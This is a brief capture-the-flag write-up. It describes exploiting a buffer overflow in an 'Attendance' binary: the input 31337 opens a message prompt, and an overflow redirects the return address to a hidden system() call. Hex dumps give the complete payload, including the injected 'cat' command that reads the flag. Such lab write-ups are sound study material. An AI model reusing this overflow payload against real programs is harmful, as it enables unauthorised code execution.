Attendance
=====
* Tools used: IDA Free, GDB, Python, Netcat
* We found in the ASM code of the executable that the input `31337` allows us to leave a message for the principal. Besides the risk of getting a lot of swear words, the principal seems that doesn't observed the buffer overflow he exposed :D Using a special crafted input we could overwrite the return address of the current function and jump to some strange function we found, function never called in the program but it contains a call to system(). Input file hex dump:
```
00000000  33 31 33 33 37 0a 61 61  61 61 61 61 61 61 61 61  |31337.aaaaaaaaaa|
00000010  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
*
00000030  61 61 61 61 61 61 60 86  04 08 01 d6 ff ff        |aaaaaa`.......|
0000003e
```
We observe that using just this won't open a shell, so we need to add the command we want to execute. (system function will take it from stack as its first and only argument):
```
00000000  33 31 33 33 37 0a 61 61  61 61 61 61 61 61 61 61  |31337.aaaaaaaaaa|
00000010  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
*
00000030  61 61 61 61 61 61 60 86  04 08 01 d6 ff ff 0a 63  |aaaaaa`........c|
00000040  61 74 20 2f 68 6f 6d 65  2f 61 74 74 65 6e 64 61  |at /home/attenda|
00000050  6e 63 65 2f 66 6c 61 67  3b 0a                    |nce/flag;.|
0000005a
```
And we just got the flag.
